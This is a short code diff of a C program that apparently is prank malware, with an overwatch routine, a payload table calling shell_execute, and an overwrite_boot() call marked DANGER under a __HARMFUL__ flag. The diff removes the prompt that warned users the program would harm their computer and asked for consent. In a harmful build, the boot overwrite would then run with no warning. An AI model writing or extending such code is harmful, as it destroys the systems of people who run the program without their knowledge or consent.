@@ -106,12 +106,10 @@ void overwatch()
 int main(int argc, char* argv[])
 {
 #ifdef __HARMFUL__
-    printf("This program WILL harm your computer. Do you want to proceed? (y/n)\n");
-    char o = getchar();
-    if (o != 'y')
-        return 0;
     overwrite_boot(); // DANGER
 #endif
+    
+    notepad_alert();
 
     if (argc == 1)
         start_overwatch();
@@ -121,7 +119,6 @@ int main(int argc, char* argv[])
 
     else if (!strcmp(argv[1], "-payload"))
     {
-        notepad_alert();
         payload_t payloads[] =
         {
             { shell_execute, 10, 10, 10000, 0, 0 },
